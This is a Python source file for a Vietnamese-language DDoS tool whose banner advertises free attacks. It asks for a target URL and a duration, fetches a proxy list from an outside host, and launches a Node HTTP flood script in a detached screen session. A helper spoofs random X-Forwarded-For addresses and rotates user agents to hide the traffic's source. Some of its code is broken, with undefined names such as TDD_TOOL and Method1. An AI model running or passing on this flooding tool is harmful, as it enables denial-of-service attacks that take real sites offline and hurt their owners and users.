from shutil import which
from urllib import parse
from os import system
import subprocess
import random
import os
import sys
import time
import json
import time
try: 
	import speedtest
	import colorama
	import requests
	import httpx
except Exception as e:
	sys.exit(e)


class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET


class Home:
	def __init__(self,
	help,
	contact):
		self.help = help
		self.contact = contact

	def styleText(self, text):
		for animation in text:
			sys.stdout.write(animation)
			sys.stdout.flush()
			if animation != ".":
				time.sleep(0.01)
			else:
				time.sleep(1)

	def home(self): 
		print(f"""{Color.LG}
\x1b[38;2;0;212;14m                       ╔═╗┌┬┐┌┬┐┌─┐┌─┐┬┌─  ╔═╗┌─┐┌┐┌┌┬┐ 
                       ╠═╣ │  │ ├─┤│  ├┴┐  ╚═╗├┤ │││ │  
                       ╩ ╩ ┴  ┴ ┴ ┴└─┘┴ ┴  ╚═╝└─┘┘└┘ ┴  
                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239m  ATTACK SENT DDOS FREE             \x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - \x1b[38;2;239;239;239mWebsite: null \x1b[38;2;0;212;14m- - \x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
                    \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
                    \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mhttps://github.com/Donghoan123/ddoss\x1b[38;2;0;49;147m║
                    \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239m    Dùng lệnh "help" để xem hướng dẫn      \x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
""")
		http_proxy = "http://viduchung.ml/vdh"
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LC+"dongddz"+Color.LY+" @ "+Color.LC+"DDoS"+Color.LR+"]"+Color.LB+"\n╚══➤ "+Color.RESET)
			option = input()
			if option == 'http' or option == 'HTTP':
				try:
					url = str(input(f"{Color.LG} 🚀 Url: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					with open("tdd/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node tdd/Method1/flood GET {url} tdd/http.txt {floodtime} 64 1'], shell=True)
				except:
					print(f"{Color.LR}LỖI: {Color.RESET}Vui lòng thử lại")
			elif option == 'refresh' or option == 'REFRESH':
				self.Method1()
			elif option == 'home' or option == 'HOME':
				TDD_Tool.home()
			elif option == 'clean' or option == 'CLEAN':
				os.system('clean')
				self.Method1()
			elif option == 'help' or option == 'HELP':
				print(self.help)
			elif option == 'contact' or option == 'CONTACT':
				print(self.contact)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f abc.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} STOP ATTACK DONE!")
			elif option == 'home' or option == 'HOME':
				os.system('clean');self.ddos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" Xem lại lệnh đi bạn ơi: help")


def spoof_useragents():
	spoof_ip = []
	ip = []
	ip1, ip2, ip3, ip4 = random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)
	ip.append(ip1), ip.append(ip2), ip.append(ip3), ip.append(ip4)

	IP = str(ip[0])+"."+str(ip[1])+"."+str(ip[2])+"."+str(ip[3])
	spoof_ip.append(IP)

	useragents = ['Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
	'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
	'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)',
	'Chrome/34.0.1847.116 Safari/537.36',
	'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
	'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01']

	return {
	'Connection': 'Keep-Alive',
	'Cache-control': 'no-cache',
	'User-Agent': random.choice(useragents).strip(),
	'X-Forwarded-For': random.choice(spoof_ip)
	}

def main():
	TDD_TOOL.styleText("Vui lòng chờ...\n\n")
	TDD_TOOL.home()


if __name__ == '__main__':
	commands = f"""Dùng Lệnh: "HTTP" hoặc "http" để bắt dầu\nDùng Lệnh Xong Bạn Nhập Url ( Website ) Rồi Enter\nEnter Xong Nhập Time ( Ưu Tiên: 120 ) Nhập Xong Enter Để DDOS\nLần DDOS Sau Làm Tương Tự\n

EXIT: Thoát\nSTOP: Ngừng DDoS\nCONTACT: Contact/Hỗ Trợ"""
	contact = f"""Facebook: https://www.facebook.com/dangdongit.info\nTelegram: donghoan123"""
	VDH_TOOL = Home(commands, contact)
	main()
